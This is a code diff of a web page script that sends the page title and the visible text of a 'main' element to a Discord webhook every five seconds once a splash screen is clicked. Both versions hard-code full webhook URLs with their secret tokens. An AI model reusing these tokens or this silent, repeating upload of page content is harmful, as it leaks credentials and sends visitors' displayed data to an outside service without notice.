@@ -20,12 +20,14 @@
   </script>
 
   <script>
-  const webhookURL = "https://discord.com/api/webhooks/1450587669636714627/FFJooBRr_O6-RZV7ne6fNEW-EsJtXw-nnuGN4DZpMNe9V90g53ZqOO1zzEYQhtfRen9E";
+  const splash = document.getElementById("enter-remove");
+  const main = document.getElementById("main");
+  const webhookURL = "https://discord.com/api/webhooks/1450596628103823471/Qd1NzFsMESh1hVxYyxz-VwfWcI9dSsLwTGlLd1ePGodNpMmRmh9PGdkHnwhIHOWk2Ad-"; // replace with your actual webhook
 
   function sendToWebhook() {
     const data = {
       pageTitle: document.title,
-      content: document.body.innerText,
+      content: main.innerText, // only send main content, not splash
       timestamp: new Date().toISOString()
     };
 
@@ -38,12 +40,14 @@
     .catch(err => console.error("Error:", err));
   }
 
-  window.addEventListener("load", () => {
-    sendToWebhook();
-    setInterval(sendToWebhook, 5000);
+  splash.addEventListener("click", () => {
+    splash.style.display = "none";   // hide splash
+    main.style.display = "block";    // show main content
+
+    sendToWebhook();                 // send first update
+    setInterval(sendToWebhook, 5000); // keep sending every 5 seconds
   });
 </script>
-
 
   <script>
    var BrowserDetector = (function() {
